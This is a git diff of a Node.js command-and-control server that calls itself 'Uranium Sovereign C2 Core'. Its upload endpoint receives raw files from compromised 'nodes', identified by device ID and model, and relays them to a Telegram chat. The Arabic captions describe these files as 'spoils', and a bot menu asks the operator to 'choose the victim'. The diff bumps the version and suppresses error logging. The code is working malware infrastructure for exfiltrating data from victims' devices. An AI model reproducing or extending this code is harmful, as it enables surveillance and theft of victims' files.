@@ -1,4 +1,4 @@
-// server_uranium_core.js - Uranium Absolute Sovereign C2 Core v7.8 Ultimate
+// server_uranium_core.js - Uranium Absolute Sovereign C2 Core v7.8.1 Ultimate
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -31,10 +31,8 @@ const db = new sqlite3.Database('./uranium_sovereign_v78.db', (err) => {
 const app = express();
 const appBot = new telegramBot(token, { polling: true });
 
-// 🛡️ درع حماية لتجاهل أخطاء الـ Polling والتداخل المؤقت لضمان استقرار السيرفر 24/7
-appBot.on('polling_error', (error) => {
-    // تجاهل أخطاء التداخل الوهمية لكي يظل السيرفر مشتعلاً بالأخضر المستقر
-});
+// 🛡️ درع حماية لتجاهل أخطاء الـ Polling وتداخل الاتصالات لضمان استقرار السيرفر 24/7
+appBot.on('polling_error', () => {});
 
 function decryptPayload(reqBody) {
     try {
@@ -62,13 +60,11 @@ app.use(express.raw({ type: 'application/octet-stream', limit: '2000mb' }));
 async function sendTg(msg, options = {}) {
     try {
         return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
-    } catch (e) {
-        console.error('TG Error:', e.message);
-    }
+    } catch (e) {}
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#050505;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM SOVEREIGN C2 CORE v7.8 ULTIMATE ONLINE [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#050505;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM SOVEREIGN C2 CORE v7.8.1 ULTIMATE ONLINE [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -89,7 +85,7 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
 
         const fileSizeMB = req.body.length / (1024 * 1024);
         await appBot.sendDocument(chatId, finalPath, { 
-            caption: `👹 <b>غنائم اليورانيوم المرعبة v7.8:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+            caption: `👹 <b>غنائم اليورانيوم المرعبة v7.8.1:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
         });
 
         res.status(200).json({ status: 'OK', message: 'URANIUM_SOVEREIGN_UPLOAD_SUCCESS' });
@@ -147,7 +143,7 @@ appBot.on('message', async (msg) => {
             rows.forEach(node => {
                 inlineKeyboard.push([{ text: `👹 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
-            await sendTg(`☢️ <b>غرفة القيادة المرعبة للإمبراطورية v7.8:</b>\nاختر الضحية:`, {
+            await sendTg(`☢️ <b>غرفة القيادة المرعبة للإمبراطورية v7.8.1:</b>\nاختر الضحية:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -199,4 +195,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Sovereign C2 Core v7.8 Ultimate Online on port ${PORT}`));
+app.listen(PORT, () => console.log(`[+] Uranium Sovereign C2 Core v7.8.1 Ultimate Online on port ${PORT}`));
